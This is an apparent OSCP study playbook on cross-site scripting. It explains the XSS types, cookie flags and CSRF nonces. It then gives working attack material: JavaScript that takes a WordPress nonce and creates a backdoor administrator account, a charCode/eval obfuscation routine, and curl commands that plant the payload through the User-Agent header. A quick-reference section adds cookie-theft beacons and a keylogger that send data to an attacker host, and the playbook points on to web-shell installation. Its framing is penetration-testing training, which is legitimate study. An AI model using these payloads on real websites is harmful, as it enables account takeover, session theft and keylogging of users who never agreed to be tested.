# Cross-Site Scripting (XSS)

## TL;DR
XSS is a vulnerability where unsanitised user input is stored or reflected
back into a web page and executed as JavaScript in another user's browser.
The attacker's code runs with the privileges of the victim's browser session.
On OSCP, XSS is most valuable when it executes in an admin's browser —
enabling admin account creation, credential theft, or CSRF bypass. The key
insight: XSS is not just a pop-up trick — it is remote JavaScript execution
in a privileged context.

---

## Why XSS Exists — The Root Cause

Web applications take input from users (search terms, usernames, comments,
HTTP headers) and display that input back somewhere in the application. When
a developer fails to **sanitise** that input — strip or encode dangerous
characters before rendering them in HTML — the browser receives what it
thinks is legitimate HTML/JavaScript and executes it.

**What sanitisation looks like when done correctly:**

```
User input:   <script>alert(1)</script>
After sanitisation: &lt;script&gt;alert(1)&lt;/script&gt;
Browser renders: <script>alert(1)</script>  (as visible text, not code)
```

**What happens when sanitisation is missing:**

```
User input:   <script>alert(1)</script>
Stored as-is: <script>alert(1)</script>
Browser renders: executes the JavaScript → pop-up appears
```

The browser cannot distinguish between JavaScript the developer intended
and JavaScript an attacker injected. It executes both.

---

## The Three Types of XSS

### Stored XSS (Persistent XSS)

The malicious payload is **saved to the server** (database, file, log) and
served to every user who loads the affected page.

```
Attack flow:
Attacker submits comment: <script>...</script>
        ↓
Server stores it in database unsanitised
        ↓
Every user who loads the comment page executes the script
        ↓
Admin visits the page → script runs in admin's browser context
```

**Why this is the highest-value XSS type on OSCP:**

A single stored payload executes every time the page is loaded — by any
user, including administrators. You do not need to trick anyone into clicking
a link. You plant the payload once and wait for a privileged user to trigger
it by doing their normal job.

**Common stored XSS locations:**
- Comment sections and forums
- User profile fields (name, bio, address)
- Product reviews
- Support ticket systems
- Log viewers and admin dashboards
- HTTP headers stored by plugins (User-Agent, X-Forwarded-For, Referer)

### Reflected XSS

The payload is embedded in a **URL or request parameter** and the server
immediately reflects it back in the response — not stored, executed once.

```
Attack flow:
Attacker crafts: http://target.com/search?q=<script>...</script>
        ↓
Victim clicks the link (sent via email, chat, social engineering)
        ↓
Server reflects q value into the HTML response
        ↓
Victim's browser executes the script
```

**OSCP relevance:** Lower priority than stored XSS because it requires
social engineering (victim must click the link). Still worth testing — if
you can reflect script into the page, document it.

**Common reflected XSS locations:**
- Search fields — query reflected in results page
- Error messages — input reflected in "X not found" messages
- URL parameters reflected directly into page content

### DOM-Based XSS

The payload is processed and executed entirely within the browser's DOM
without the server ever seeing the malicious content. JavaScript on the page
reads a value from the URL (e.g. `location.hash`, `document.referrer`) and
writes it to the DOM unsafely.

```
Attack flow:
Attacker crafts: http://target.com/page#<img src=x onerror=alert(1)>
        ↓
Browser's own JavaScript reads location.hash value
        ↓
Insecure JS writes it to innerHTML → DOM modified → code executes
        ↓
Server never sees the # fragment — entirely client-side
```

**OSCP relevance:** Harder to find without source code. Recognise the
pattern when you see JavaScript reading from `location.hash`, `location.search`,
or `document.referrer` and writing to `innerHTML` or `document.write`.

---

## What is the DOM and Why Does JavaScript Control It?

The DOM (Document Object Model) is the browser's internal representation of
a web page as a tree of objects. Every HTML element — form, button, input,
div — is a node in this tree. JavaScript's entire purpose in a browser is to
read and modify this tree, making pages dynamic and interactive.

From an attacker's perspective: if you can inject JavaScript into a page,
you have read/write access to the entire DOM — every form field, every
button, every link. You can:

```javascript
// Read any form field value
document.getElementById("password").value

// Modify a form's submission destination
document.querySelector("form").action = "http://attacker.com/steal"

// Read any cookie not protected by HttpOnly
document.cookie

// Make HTTP requests as the victim
var xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/create-user", false);
xhr.send(params);

// Read the page's HTML
document.body.innerHTML
```

This is why XSS in an admin's browser is so powerful — you are running code
in a context that already has administrative session cookies and can make
authenticated requests.

---

## Cookie Flags — What Stops Cookie Theft and What Doesn't

Stealing session cookies via XSS is the most intuitive attack — get the
cookie, impersonate the user. But two cookie flags block this:

### HttpOnly Flag

```
Set-Cookie: session=abc123; HttpOnly
```

`HttpOnly` instructs the browser to deny JavaScript access to the cookie.
`document.cookie` will not return it. An XSS payload that tries to steal
this cookie will get nothing.

**What to check:**
```
F12 → Application → Cookies → look at HttpOnly column
OR
curl -k -I https://<TARGET>/ | grep -i "set-cookie"
```

**When HttpOnly is set on session cookies:** You cannot steal the session
token via XSS. Pivot to a different XSS attack goal:
- Create a new admin user (using CSRF bypass via XSS)
- Keylog the login form
- Modify the page to redirect form submissions to your server
- Perform actions on behalf of the logged-in user via XHR

### Secure Flag

```
Set-Cookie: session=abc123; Secure
```

Cookie only sent over HTTPS. If you somehow capture network traffic, this
cookie will not appear in HTTP requests. Largely irrelevant to XSS attacks.

---

## What is CSRF and Why Does XSS Bypass It?

### CSRF (Cross-Site Request Forgery)

CSRF is an attack where a malicious link or page causes a victim's browser
to make an authenticated request to a site the victim is logged into —
without their knowledge.

```html
<!-- Attacker embeds this in a phishing email -->
<a href="http://bank.com/transfer?to=attacker&amount=10000">
  Click here for free money
</a>
```

If the victim is logged into bank.com, clicking the link executes the
transfer because the browser automatically includes session cookies.

### How Applications Defend Against CSRF — Nonces

A **nonce** (number used once) is a server-generated random token embedded
in every HTML form. When the form is submitted, the server checks that the
nonce matches what it issued. An attacker who crafts a malicious request
cannot know the nonce because it was generated specifically for the victim's
session.

```html
<input type="hidden" name="_wpnonce" value="a3f9b2c1d4">
```

### Why XSS Bypasses CSRF Nonces

When your XSS payload executes in the admin's browser, it has the same
access the admin's browser has. It can:

1. Make a GET request to the admin page → receive the HTML → extract
   the nonce using regex
2. Use that nonce in a POST request to create a new user

The nonce is no obstacle to XSS because XSS runs in the same browser that
receives and can read the nonce. CSRF protection defends against requests
from other origins — not from JavaScript already running on the same origin.

---

## Phase 1 — Identifying XSS Entry Points

### What Characters to Test

Every input field is a potential XSS entry point. Test these characters
first — they are the building blocks of HTML and JavaScript. If any return
unencoded in the page output, XSS is possible:

```
< > ' " { } ;
```

| Character | Role | Why It Matters |
|---|---|---|
| `<` and `>` | HTML tags | Required to inject `<script>` or `<img>` tags |
| `'` and `"` | String delimiters | Required to break out of attribute values |
| `{` and `}` | JS code blocks | Required for function bodies |
| `;` | JS statement end | Required to chain JavaScript statements |

### Where to Test

```
All visible input fields:
  - Search boxes
  - Comment fields
  - Username / profile fields
  - Contact forms
  - Review / feedback fields

HTTP headers (often stored by analytics/logging plugins):
  - User-Agent
  - Referer
  - X-Forwarded-For
  - Cookie values

URL parameters:
  - ?q=, ?search=, ?page=, ?name=
```

### Basic Proof-of-Concept Payloads

```javascript
// Simplest test — produces alert pop-up if XSS works
<script>alert(1)</script>

// Alternative — uses event handler instead of script tag
// (bypasses some filters that block <script> tags)
<img src=x onerror=alert(1)>

// Tests if quotes are encoded (insert inside an attribute value)
"><script>alert(1)</script>

// Tests for XSS inside a JavaScript string
';alert(1)//

// Tests for filter bypass with case variation
<ScRiPt>alert(1)</ScRiPt>

// Tests for filter bypass with encoding
<script>alert(String.fromCharCode(88,83,83))</script>
```

**What to observe:**
- Alert pop-up appears → XSS confirmed, payload executed
- Characters appear as `&lt;` `&gt;` in source → sanitised, not vulnerable
- Characters disappear completely → filtered, try bypass techniques
- Error message appears → server-side validation triggered

### Testing HTTP Headers via Burp

HTTP headers like User-Agent are invisible to normal users but frequently
stored by logging plugins and displayed in admin dashboards:

```
1. Browse to target with Intercept OFF
2. Proxy → HTTP History → right-click any request → Send to Repeater
3. In Repeater: find User-Agent header line
4. Replace value with: <script>alert(1)</script>
5. Send → confirm 200 OK
6. If the app stores User-Agents: log in as admin → navigate to log/stats page
7. Alert pop-up = stored XSS in User-Agent confirmed
```

---

## Phase 2 — Basic XSS Exploitation

### Delivering a Stored XSS Payload via curl

Once you know the target field (e.g. User-Agent), you can deliver payloads
directly without using a browser:

```bash
# Basic alert proof-of-concept via User-Agent
curl -i http://<TARGET_IP> \
  --user-agent "<script>alert(42)</script>"

# Via Burp proxy for inspection
curl -i http://<TARGET_IP> \
  --user-agent "<script>alert(42)</script>" \
  --proxy 127.0.0.1:8080
```

**Confirming success:**
1. Log into the application as admin (or wait for admin to log in)
2. Navigate to the page that displays the stored User-Agent data
3. Alert pop-up = your JavaScript executed in the admin's browser

---

## Phase 3 — Privilege Escalation via XSS

### The Attack Goal

When session cookies are HttpOnly (unsteelable), the next most powerful
XSS attack is **creating a new admin user** using the victim admin's session.
The admin's browser has an active authenticated session — your injected
JavaScript uses that session to make authenticated admin requests.

### The WordPress Attack Chain

This chain targets WordPress but the principles apply to any CMS or web
app that uses nonce-based CSRF protection:

```
Step 1: Inject XSS payload into stored field (User-Agent)
Step 2: Admin loads the page → JavaScript executes in admin's browser
Step 3: JS fetches /wp-admin/user-new.php → extracts nonce from response
Step 4: JS POSTs new admin user creation using extracted nonce
Step 5: New backdoor admin account created
Step 6: Log in as new admin → full WordPress access
```

### The JavaScript Payload — Explained

**Part 1: Fetch the nonce**

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);  // false = synchronous
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

- `XMLHttpRequest` is JavaScript's built-in HTTP client
- `open("GET", URL, false)` — synchronous GET to the user creation page
- The regex `/ser" value="([^"]*?)"/g` matches the nonce field in the HTML:
  `name="_wpnonce_create-user" value="a3f9b2c1"` — extracts `a3f9b2c1`
- This works because the XSS runs in the admin's browser which has
  the admin session cookie — the GET request to `/wp-admin/` succeeds

**Part 2: Create the admin user**

```javascript
var params = "action=createuser&_wpnonce_create-user=" + nonce +
  "&user_login=<BACKDOOR_USER>&email=<BACKDOOR_EMAIL>" +
  "&pass1=<BACKDOOR_PASS>&pass2=<BACKDOOR_PASS>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type",
  "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

- Posts to the same user-new.php with the nonce we extracted
- Includes `role=administrator` — creates a full admin account
- `pass1` and `pass2` must match — same value for both

### Preparing the Payload for Delivery

Raw multi-line JavaScript with spaces and newlines may break when embedded
in an HTTP header. Two preparation steps make it reliable:

**Step 1 — Minify (remove all whitespace and newlines)**

Use https://jscompress.com or locally:

```bash
# Install uglify-js for local minification
npm install -g uglifyjs
uglifyjs payload.js -o payload.min.js

# Or use python to strip excess whitespace (basic minification)
python3 -c "
import re, sys
code = open('payload.js').read()
code = re.sub(r'\s+', ' ', code).strip()
print(code)
"
```

**Step 2 — Encode to charCode array (bypass bad character filters)**

Run this function in your browser console (`F12 → Console → about:blank`):

```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for (pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if (pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}
let encoded = encode_to_javascript('PASTE_MINIFIED_JS_HERE');
console.log(encoded);
```

Copy the output — it is a comma-separated list of decimal numbers, each
representing one character of your JavaScript.

**Why charCode encoding?**

`charCodeAt()` converts each character to its UTF-16 integer code.
`String.fromCharCode()` converts integers back to characters at runtime.
The delivery payload contains only numbers and commas — no `<`, `>`, `"`,
or other characters that might be filtered or break HTTP header parsing.

**Step 3 — Wrap in eval/fromCharCode decoder**

```javascript
eval(String.fromCharCode(ENCODED_NUMBER_ARRAY))
```

When this executes:
1. `String.fromCharCode(118,97,114,...)` reconstructs the original JS string
2. `eval()` executes that string as JavaScript
3. Your full attack payload runs

**Step 4 — Wrap in script tags for HTTP header delivery**

```
<script>eval(String.fromCharCode(NUMBERS))</script>
```

### Complete Delivery Command

```bash
curl -i http://<TARGET_IP> \
  --user-agent "<script>eval(String.fromCharCode(<ENCODED_NUMBERS>))</script>" \
  --proxy 127.0.0.1:8080
```

The `--proxy` flag routes through Burp so you can inspect the request
before it is sent. With Intercept ON in Burp, you can review and forward.

### Verifying Success

```
1. After delivering payload:
   → Log into WordPress as admin (or the existing admin account)
   → Navigate to page that triggers the stored XSS
     (e.g. Visitors plugin: /wp-admin/admin.php?page=visitors-app/admin/start.php)
   → The XSS executes silently — no visible pop-up with this payload

2. Verify admin creation:
   → WordPress admin → Users menu (left sidebar)
   → Your backdoor username appears in the list with Administrator role

3. Log in as backdoor admin:
   → /wp-login.php → your credentials → full admin access
```

---

## Adapting to Non-WordPress Targets

The specific nonce field regex and endpoint change per application. The
underlying pattern stays the same:

```
1. Identify the admin function you want to abuse
   (create user, change password, modify role, install plugin)

2. Visit that admin page manually as admin → Inspector → find the nonce field
   → note the field name in the HTML: name="_csrf_token" / name="nonce" etc.

3. Adapt the regex to match that field name:
   /csrf_token" value="([^"]*?)"/g   ← match the specific field name

4. Adapt the POST parameters to match what that form submits
   (capture in Burp by submitting the form normally first)

5. Deliver via the stored XSS vector
```

---

## XSS Payload Quick Reference

```javascript
// Proof of concept — alert
<script>alert(1)</script>

// Image tag fallback — bypasses script-tag filters
<img src=x onerror=alert(1)>

// SVG fallback
<svg onload=alert(1)>

// Cookie theft (only works if HttpOnly NOT set)
<script>document.location='http://<LHOST>/steal?c='+document.cookie</script>

// Cookie theft via image beacon
<script>new Image().src='http://<LHOST>/steal?c='+document.cookie</script>

// WordPress nonce fetch + admin create (minified template)
var r=new XMLHttpRequest(),u="/wp-admin/user-new.php",x=/ser" value="([^"]*?)"/g;
r.open("GET",u,false);r.send();
var n=x.exec(r.responseText)[1];
var p="action=createuser&_wpnonce_create-user="+n+
  "&user_login=<USER>&email=<EMAIL>&pass1=<PASS>&pass2=<PASS>&role=administrator";
r=new XMLHttpRequest();r.open("POST",u,true);
r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
r.send(p);

// Keylogger (captures keystrokes and sends to attacker)
<script>
document.onkeypress=function(e){
  new Image().src='http://<LHOST>/log?k='+e.key;
}
</script>
```

---

## Exam-Day XSS Workflow

```
Web app found — looking for XSS
        ↓
1. Identify all input fields + HTTP headers stored by the app
   → search, comments, profile fields, User-Agent, Referer
        ↓
2. Test each with: < > ' " { } ;
   → Check if characters appear unencoded in page source
        ↓
3. If unencoded: test <script>alert(1)</script>
   → Pop-up = XSS confirmed
   → No pop-up: try <img src=x onerror=alert(1)> and other bypasses
        ↓
4. Identify who sees the stored payload
   → Admin dashboard? → high value → proceed to privilege escalation
   → Regular users only? → consider cookie theft or redirect attacks
        ↓
5. Check session cookie flags
   F12 → Application → Cookies → HttpOnly column
   → HttpOnly set → cannot steal cookie → pivot to admin user creation
   → HttpOnly NOT set → steal cookie via document.location/Image beacon
        ↓
6. For admin user creation via XSS:
   → Visit admin user creation page → Inspector → find nonce field name
   → Write JS: fetch nonce → POST new admin user
   → Minify → encode to charCode → wrap in eval/fromCharCode
   → Deliver via stored XSS vector (curl User-Agent or input field)
   → Trigger by visiting the page that displays stored payload as admin
   → Verify new admin in Users list → log in
        ↓
7. With admin access:
   → Install webshell plugin → RCE → full system access
   → See: playbooks/wordpress-exploitation.md
```

---

## Gotchas & Exam Tips

- **XSS is only as valuable as who executes it.** A stored XSS that only
  you see is useless. The value is in the victim — specifically an admin.
  Always determine who views the affected page before investing in a complex
  payload.

- **HttpOnly means pivot, not give up.** Most OSCP XSS scenarios involve
  HttpOnly cookies. The correct response is not "XSS is useless here" but
  "I cannot steal cookies, so I create a new admin account instead."

- **The nonce is not an obstacle for XSS.** Developers often think CSRF
  tokens protect admin actions from XSS. They do not — XSS runs in the
  same browser session that can read the nonce. XSS bypasses CSRF protection
  inherently.

- **`eval()` is your delivery mechanism, not your weakness.** Some
  candidates avoid `eval()` thinking it will be filtered. On OSCP lab
  machines, filters are typically absent or basic. Use charCode encoding
  for reliable delivery — it avoids `<`, `>`, `"` in the payload body
  while still being decoded and executed faithfully.

- **Test HTTP headers, not just form fields.** The WordPress Visitors plugin
  vulnerability — and many like it — exists in the User-Agent or Referer
  header, not in a visible form. Always send a basic alert payload in
  User-Agent via Burp Repeater against any target running analytics,
  logging, or visitor tracking software.

- **Minify before delivery.** Multi-line JavaScript with newlines can break
  when sent in an HTTP header. Always minify to a single line before delivery
  via curl User-Agent.

- **Verify the nonce regex against the actual HTML.** The regex
  `/ser" value="([^"]*?)"/g` matches the WordPress nonce field specifically.
  For other applications, open the admin form in Inspector, find the actual
  field name, and write a regex that matches it exactly.

---

## Quick Reference — Key Commands

```bash
# Basic XSS via User-Agent (stored)
curl -i http://<TARGET_IP> \
  --user-agent "<script>alert(1)</script>"

# Via Burp for inspection
curl -i http://<TARGET_IP> \
  --user-agent "<script>alert(1)</script>" \
  --proxy 127.0.0.1:8080

# Privilege escalation payload delivery (charCode encoded)
curl -i http://<TARGET_IP> \
  --user-agent "<script>eval(String.fromCharCode(<NUMBERS>))</script>" \
  --proxy 127.0.0.1:8080

# Check cookie flags
curl -k -I https://<TARGET>/ | grep -i "set-cookie"

# Encode JS to charCode (run in browser console)
# function encode_to_javascript(string) {
#   var output = '';
#   for(pos = 0; pos < string.length; pos++) {
#     output += string.charCodeAt(pos);
#     if(pos != (string.length-1)) { output += ","; }
#   }
#   return output;
# }
# let encoded = encode_to_javascript('YOUR_MINIFIED_JS');
# console.log(encoded);
```

---

## Next Steps After XSS

| Outcome | Next Action |
|---|---|
| Admin cookies stolen (no HttpOnly) | Use cookie in Burp → impersonate admin → full app access |
| New admin account created | Log in → install web shell plugin → `playbooks/wordpress-exploitation.md` |
| Admin access to WordPress | Custom plugin with PHP web shell → RCE |
| Reflected XSS found (no stored) | Document it — craft malicious URL for phishing if social engineering in scope |
| XSS in login form | Credential harvesting — redirect form to your server |
